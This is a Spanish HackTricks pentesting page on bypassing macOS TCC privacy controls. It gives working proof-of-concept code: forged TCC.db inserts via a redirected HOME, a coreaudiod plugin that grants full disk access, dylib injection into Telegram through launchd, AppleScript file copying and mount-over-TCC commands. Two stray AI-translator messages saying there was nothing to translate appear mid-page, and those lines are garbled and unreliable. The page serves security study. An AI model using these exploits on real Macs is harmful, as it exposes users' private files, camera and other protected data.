# Evasiones de macOS TCC

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver a tu **empresa anunciada en HackTricks**? o ¿quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Por funcionalidad

### Evasión de Escritura

Esto no es una evasión, es simplemente cómo funciona TCC: **No protege contra la escritura**. Si Terminal **no tiene acceso para leer el Escritorio de un usuario, aún puede escribir en él**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
El **atributo extendido `com.apple.macl`** se añade al nuevo **archivo** para dar acceso de lectura a la **aplicación creadora**.

### Bypass de SSH

Por defecto, un acceso vía **SSH solía tener "Acceso Completo al Disco"**. Para deshabilitar esto necesitas tenerlo listado pero desactivado (eliminarlo de la lista no quitará esos privilegios):

![](<../../../../../.gitbook/assets/image (569).png>)

Aquí puedes encontrar ejemplos de cómo algunos **malwares han podido eludir esta protección**:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
Ten en cuenta que ahora, para poder habilitar SSH necesitas **Acceso Completo al Disco**
{% endhint %}

### Manejo de extensiones - CVE-2022-26767

El atributo **`com.apple.macl`** se otorga a archivos para dar **permisos a cierta aplicación para leerlo.** Este atributo se establece cuando se **arrastra y suelta** un archivo sobre una aplicación, o cuando un usuario **hace doble clic** en un archivo para abrirlo con la **aplicación predeterminada**.

Por lo tanto, un usuario podría **registrar una aplicación maliciosa** para manejar todas las extensiones y llamar a Servicios de Lanzamiento para **abrir** cualquier archivo (así el archivo malicioso obtendrá acceso para leerlo).

### iCloud

Con el derecho **`com.apple.private.icloud-account-access`** es posible comunicarse con el servicio XPC **`com.apple.iCloudHelper`** que **proporcionará tokens de iCloud**.

**iMovie** y **Garageband** tenían este derecho y otros que permitían.

Para más **información** sobre el exploit para **obtener tokens de icloud** de ese derecho, consulta la charla: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automatización

Una aplicación con el permiso **`kTCCServiceAppleEvents`** podrá **controlar otras aplicaciones**. Esto significa que podría **abusar de los permisos otorgados a las otras aplicaciones**.

Para más información sobre Apple Scripts consulta:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

Por ejemplo, si una aplicación tiene **permiso de Automatización sobre `iTerm`**, por ejemplo en este caso **`Terminal`** tiene acceso sobre iTerm:

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### Sobre iTerm

Terminal, que no tiene FDA, puede llamar a iTerm, que sí lo tiene, y usarlo para realizar acciones:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
No hay contenido en inglés proporcionado para traducir. Por favor, proporcione el texto que necesita ser traducido.
```bash
osascript iterm.script
```
#### A través de Finder

O si una App tiene acceso a través de Finder, podría ejecutar un script como este:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Por comportamiento de la aplicación

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

El **daemon tccd** en espacio de usuario estaba utilizando la variable de entorno **`HOME`** para acceder a la base de datos de usuarios TCC desde: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

De acuerdo con [este post de Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) y debido a que el daemon TCC se ejecuta a través de `launchd` dentro del dominio del usuario actual, es posible **controlar todas las variables de entorno** que se le pasan.\
Por lo tanto, un **atacante podría configurar la variable de entorno `$HOME`** en **`launchctl`** para que apunte a un **directorio controlado**, **reiniciar** el daemon **TCC** y luego **modificar directamente la base de datos TCC** para otorgarse **todos los permisos TCC disponibles** sin nunca solicitar la autorización del usuario final.\
Prueba de concepto (PoC):
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notas

Notas tenía acceso a ubicaciones protegidas por TCC, pero cuando se crea una nota, esta se **crea en una ubicación no protegida**. Entonces, podrías pedirle a notas que copie un archivo protegido en una nota (así que en una ubicación no protegida) y luego acceder al archivo:

<figure><img src="../../../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocación

El binario `/usr/libexec/lsd` con la biblioteca `libsecurity_translocate` tenía el derecho `com.apple.private.nullfs_allow` que le permitía crear un montaje **nullfs** y tenía el derecho `com.apple.private.tcc.allow` con **`kTCCServiceSystemPolicyAllFiles`** para acceder a todos los archivos.

Era posible agregar el atributo de cuarentena a "Library", llamar al servicio XPC **`com.apple.security.translocation`** y luego mapearía Library a **`$TMPDIR/AppTranslocation/d/d/Library`** donde todos los documentos dentro de Library podrían ser **accedidos**.

### CVE-2023-38571 - Música y TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** tiene una característica interesante: Cuando está en funcionamiento, **importará** los archivos arrastrados a **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** en la "biblioteca de medios" del usuario. Además, llama a algo como: **`rename(a, b);`** donde `a` y `b` son:

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`

Este comportamiento de **`rename(a, b);`** es vulnerable a una **Condición de Carrera**, ya que es posible poner dentro de la carpeta `Automatically Add to Music.localized` un archivo falso **TCC.db** y luego cuando se cree la nueva carpeta(b) para copiar el archivo, eliminarlo y apuntarlo a **`~/Library/Application Support/com.apple.TCC`**/.

### SQLITE_SQLLOG_DIR - CVE-2023-32422

Si **`SQLITE_SQLLOG_DIR="path/folder"`** básicamente significa que **cualquier base de datos abierta se copia en esa ruta**. En este CVE, este control fue abusado para **escribir** dentro de una **base de datos SQLite** que va a ser **abierta por un proceso con FDA la base de datos TCC**, y luego abusar de **`SQLITE_SQLLOG_DIR`** con un **enlace simbólico en el nombre del archivo** para que cuando esa base de datos esté **abierta**, el **TCC.db del usuario sea sobrescrito** con la abierta.\
**Más información** [**en el análisis detallado**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **y**[ **en la charla**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s).

### **SQLITE_AUTO_TRACE**

Si la variable de entorno **`SQLITE_AUTO_TRACE`** está establecida, la biblioteca **`libsqlite3.dylib`** comenzará a **registrar** todas las consultas SQL. Muchas aplicaciones usaban esta biblioteca, por lo que era posible registrar todas sus consultas SQLite.

Varias aplicaciones de Apple usaban esta biblioteca para acceder a información protegida por TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407

Esta **variable de entorno es utilizada por el framework `Metal`** que es una dependencia de varios programas, especialmente `Music`, que tiene FDA.

Estableciendo lo siguiente: `MTL_DUMP_PIPELINES_TO_JSON_FILE="ruta/nombre"`. Si `ruta` es un directorio válido, se activará el error y podemos usar `fs_usage` para ver qué está sucediendo en el programa:

* se abrirá (`open()`) un archivo llamado `ruta/.dat.nosyncXXXX.XXXXXX` (X es aleatorio)
* una o más operaciones de `write()` escribirán el contenido en el archivo (esto no lo controlamos)
* `ruta/.dat.nosyncXXXX.XXXXXX` será renombrado (`renamed()`) a `ruta/nombre`

Es una escritura de archivo temporal, seguida de un **`rename(old, new)`** **que no es seguro.**

No es seguro porque tiene que **resolver las rutas antigua y nueva por separado**, lo cual puede llevar tiempo y ser vulnerable a una Condición de Carrera. Para más información, puedes consultar la función `xnu` `renameat_internal()`.

{% hint style="danger" %}
Básicamente, si un proceso privilegiado está renombrando desde una carpeta que controlas, podrías ganar un RCE y hacer que acceda a un archivo diferente o, como en este CVE, abrir el archivo que la aplicación privilegiada creó y almacenar un FD.

Si el rename accede a una carpeta que controlas, mientras has modificado el archivo fuente o tienes un FD para él, cambias el archivo de destino (o carpeta) para que apunte a un enlace simbólico, así puedes escribir cuando quieras.
{% endhint %}

Este fue el ataque en el CVE: Por ejemplo, para sobrescribir el `TCC.db` del usuario, podemos:

* crear `/Users/hacker/ourlink` para que apunte a `/Users/hacker/Library/Application Support/com.apple.TCC/`
* crear el directorio `/Users/hacker/tmp/`
* establecer `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
* activar el error ejecutando `Music` con esta variable de entorno
* capturar el `open()` de `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X es aleatorio)
* aquí también `open()` este archivo para escribir, y mantener el descriptor de archivo
* cambiar de forma atómica `/Users/hacker/tmp` por `/Users/hacker/ourlink` **en un bucle**
* hacemos esto para maximizar nuestras posibilidades de éxito ya que la ventana de carrera es bastante estrecha, pero perder la carrera tiene una desventaja insignificante
* esperar un poco
* probar si tuvimos suerte
* si no, empezar de nuevo desde el principio

Más información en [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

{% hint style="danger" %}
Ahora, si intentas usar la variable de entorno `MTL_DUMP_PIPELINES_TO_JSON_FILE` las aplicaciones no se iniciarán
{% endhint %}

### Apple Remote Desktop

Como root podrías habilitar este servicio y el **agente de ARD tendrá acceso completo al disco** que luego podría ser abusado por un usuario para hacer que copie una nueva **base de datos de usuario de TCC**.

## Por **NFSHomeDirectory**

TCC utiliza una base de datos en la carpeta HOME del usuario para controlar el acceso a recursos específicos del usuario en **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Por lo tanto, si el usuario logra reiniciar TCC con una variable de entorno $HOME apuntando a una **carpeta diferente**, el usuario podría crear una nueva base de datos de TCC en **/Library/Application Support/com.apple.TCC/TCC.db** y engañar a TCC para otorgar cualquier permiso de TCC a cualquier aplicación.

{% hint style="success" %}
Nota que Apple utiliza la configuración almacenada dentro del perfil del usuario en el atributo **`NFSHomeDirectory`** para el **valor de `$HOME`**, así que si comprometes una aplicación con permisos para modificar este valor (**`kTCCServiceSystemPolicySysAdminFiles`**), puedes **armar** esta opción con un bypass de TCC.
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

El **primer POC** utiliza [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) y [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) para modificar la carpeta **HOME** del usuario.

1. Obtener un blob _csreq_ para la aplicación objetivo.
2. Plantar un archivo _TCC.db_ falso con el acceso requerido y el blob _csreq_.
3. Exportar la entrada de Servicios de Directorio del usuario con [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Modificar la entrada de Servicios de Directorio para cambiar la carpeta home del usuario.
5. Importar la entrada de Servicios de Directorio modificada con [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Detener el _tccd_ del usuario y reiniciar el proceso.

El segundo POC utilizó **`/usr/libexec/configd`** que tenía `com.apple.private.tcc.allow` con el valor `kTCCServiceSystemPolicySysAdminFiles`.\
Era posible ejecutar **`configd`** con la opción **`-t`**, un atacante podría especificar un **Bundle personalizado para cargar**. Por lo tanto, el exploit **reemplaza** el método de **`dsexport`** y **`dsimport`** de cambiar la carpeta home del usuario con una **inyección de código en `configd`**.

Para más información consulta el [**informe original**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Por inyección de proceso

Hay diferentes técnicas para inyectar código dentro de un proceso y abusar de sus privilegios de TCC:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

Además, la inyección de proceso más común para eludir TCC encontrada es a través de **plugins (carga de biblioteca)**.\
Los plugins son código adicional generalmente en forma de bibliotecas o plist, que serán **cargados por la aplicación principal** y se ejecutarán bajo su contexto. Por lo tanto, si la aplicación principal tenía acceso a archivos restringidos por TCC (a través de permisos otorgados o derechos), el **código personalizado también lo tendrá**.

### CVE-2020-27937 - Directory Utility

La aplicación `/System/Library/CoreServices/Applications/Directory Utility.app` tenía el derecho **`kTCCServiceSystemPolicySysAdminFiles`**, cargaba plugins con la extensión **`.daplug`** y **no tenía** el runtime endurecido.

Para armar este CVE, el **`NFSHomeDirectory`** se **cambia** (abusando del derecho anterior) para poder **tomar control de la base de datos TCC del usuario** y eludir TCC.

Para más información consulta el [**informe original**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

El binario **`/usr/sbin/coreaudiod`** tenía los derechos `com.apple.security.cs.disable-library-validation` y `com.apple.private.tcc.manager`. El primero **permitiendo la inyección de código** y el segundo otorgándole acceso para **gestionar TCC**.

Este binario permitía cargar **plugins de terceros** desde la carpeta `/Library/Audio/Plug-Ins/HAL`. Por lo tanto, era posible **cargar un plugin y abusar de los permisos de TCC** con este PoC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Para más información, consulta el [**informe original**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Complementos de Device Abstraction Layer (DAL)

Las aplicaciones del sistema que abren un flujo de cámara a través de Core Media I/O (aplicaciones con **`kTCCServiceCamera`**) cargan **en el proceso estos complementos** ubicados en `/Library/CoreMediaIO/Plug-Ins/DAL` (no restringido por SIP).

Simplemente almacenar en ese directorio una biblioteca con el **constructor** común funcionará para **inyectar código**.

Varias aplicaciones de Apple eran vulnerables a esto.

### Firefox

La aplicación Firefox tenía los derechos `com.apple.security.cs.disable-library-validation` y `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Para más información sobre cómo explotar esto fácilmente, [**consulta el informe original**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

El binario `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` tenía los entitlements **`com.apple.private.tcc.allow`** y **`com.apple.security.get-task-allow`**, lo que permitía inyectar código dentro del proceso y utilizar los privilegios de TCC.

### CVE-2023-26818 - Telegram

Telegram tenía los entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** y **`com.apple.security.cs.disable-library-validation`**, por lo que era posible abusar de ello para **obtener acceso a sus permisos** como grabar con la cámara. Puedes [**encontrar el payload en el writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Nota cómo usar la variable de entorno para cargar una biblioteca, se creó un **plist personalizado** para inyectar esta biblioteca y se utilizó **`launchctl`** para lanzarla:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Invocaciones con `open`

Es posible invocar **`open`** incluso estando en un entorno aislado (sandboxed).

### Scripts de Terminal

Es bastante común otorgar al terminal **Acceso Completo al Disco (FDA)**, al menos en computadoras utilizadas por personas técnicas. Y es posible invocar scripts **`.terminal`** con él.

Los scripts **`.terminal`** son archivos plist como este, con el comando a ejecutar en la clave **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Una aplicación podría escribir un script de terminal en una ubicación como /tmp y lanzarlo con un comando como:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Mediante montaje

### CVE-2020-9771 - bypass de TCC y escalada de privilegios con mount\_apfs

**Cualquier usuario** (incluso los no privilegiados) puede crear y montar una instantánea de Time Machine y **acceder a TODOS los archivos** de esa instantánea.\
El **único privilegio** necesario es que la aplicación utilizada (como `Terminal`) tenga acceso a **Acceso Completo al Disco** (FDA por sus siglas en inglés) (`kTCCServiceSystemPolicyAllfiles`), el cual debe ser otorgado por un administrador.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

Una explicación más detallada se puede [**encontrar en el informe original**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Montar sobre el archivo TCC

Aunque el archivo de la base de datos TCC esté protegido, fue posible **montar sobre el directorio** un nuevo archivo TCC.db:

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
Since the provided text does not contain any content to translate, I cannot provide a translation. If you have specific content from the hacking book that you would like translated into Spanish, please provide the text, and I will translate it accordingly while maintaining the markdown and HTML syntax.
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Consulte el **exploit completo** en el [**artículo original**](https://theevilbit.github.io/posts/cve-2021-30808/).

### asr

La herramienta **`/usr/sbin/asr`** permitía copiar todo el disco y montarlo en otro lugar, eludiendo las protecciones de TCC.

### Servicios de Ubicación

Hay una tercera base de datos de TCC en **`/var/db/locationd/clients.plist`** para indicar clientes autorizados a **acceder a los servicios de ubicación**.\
La carpeta **`/var/db/locationd/` no estaba protegida contra el montaje de DMG** por lo que era posible montar nuestro propio plist.

## Por aplicaciones de inicio

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## Por grep

En varias ocasiones, los archivos almacenan información sensible como correos electrónicos, números de teléfono, mensajes... en ubicaciones no protegidas (lo que se considera una vulnerabilidad en Apple).

<figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## Clicks Sintéticos

Esto ya no funciona, pero [**funcionó en el pasado**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Otra forma utilizando [**eventos de CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf):

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## Referencia

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ formas de eludir los mecanismos de privacidad de tu macOS**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Victoria contundente contra TCC - 20+ NUEVAS formas de eludir los mecanismos de privacidad de tu MacOS**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? o ¿quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs exclusivos**](https://opensea.io/collection/the-peass-family)
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
